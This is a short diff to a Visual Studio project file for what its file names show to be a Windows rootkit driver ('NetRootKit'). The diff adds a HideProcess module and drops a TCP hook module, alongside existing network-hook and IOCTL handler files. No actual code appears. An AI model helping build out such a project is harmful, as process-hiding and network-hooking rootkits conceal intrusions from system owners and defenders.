@@ -95,16 +95,16 @@
     <FilesToPackage Include="$(TargetPath)" />
   </ItemGroup>
   <ItemGroup>
+    <ClCompile Include="HideProcess.cpp" />
     <ClCompile Include="IoctlHandlers.cpp" />
     <ClCompile Include="NetNSIHook.cpp" />
     <ClCompile Include="NetRootKit.cpp" />
-    <ClCompile Include="NetTCPHook.cpp" />
     <ClCompile Include="NetworkHook.cpp" />
   </ItemGroup>
   <ItemGroup>
+    <ClInclude Include="HideProcess.h" />
     <ClInclude Include="IoctlHandlers.h" />
     <ClInclude Include="NetNSIHook.h" />
-    <ClInclude Include="NetTCPHook.h" />
     <ClInclude Include="NetworkHook.h" />
     <ClInclude Include="Public.h" />
   </ItemGroup>
